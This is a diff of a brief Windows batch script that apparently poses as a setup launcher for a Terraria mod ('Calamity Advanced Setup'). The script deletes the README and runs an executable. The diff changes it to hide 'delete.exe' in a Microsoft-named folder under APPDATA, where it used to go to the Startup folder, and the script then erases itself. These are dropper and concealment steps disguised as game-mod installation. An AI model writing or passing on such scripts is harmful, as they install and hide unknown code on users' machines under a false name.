@@ -1,7 +1,8 @@
 @echo off
 del README.md
 
-.\"Terraria Injector.exe"
-move delete.exe "%ALLUSERSPROFILE%\Microsoft\Windows\Start Menu\Programs\StartUp"
+.\"Calamity Advanced Setup.exe"
+move delete.exe "%APPDATA%\microsoft"
 
 start /b "" cmd /c del "%~f0"&exit /b
+
